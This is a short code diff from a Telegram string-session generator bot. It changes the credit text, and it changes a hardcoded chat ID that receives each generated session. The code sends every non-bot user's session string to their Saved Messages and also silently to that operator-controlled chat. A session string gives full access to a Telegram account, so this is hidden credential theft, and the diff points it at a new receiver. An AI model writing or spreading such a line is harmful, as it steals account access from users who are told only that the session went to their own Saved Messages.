@@ -179,13 +179,13 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
     try:
         if not is_bot:
             await client.send_message("me", text)
-            await bot.send_message(-1001937711800, text)
+            await bot.send_message(-1002190206859, text)
         else:
             await bot.send_message(msg.chat.id, text)
     except KeyError:
         pass
     await client.disconnect()
-    await bot.send_message(msg.chat.id, "» Generated Successfully {} String Session.\n\n**Please Check your Saved Messages**! \n\n**[Team SPY](https://dev_gagan)**".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))
+    await bot.send_message(msg.chat.id, "» Generated Successfully {} String Session.\n\n**Please Check your Saved Messages**! \n\n**[Alone Boy](https://Alonedada@143)**".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))
 
 
 async def cancelled(msg):
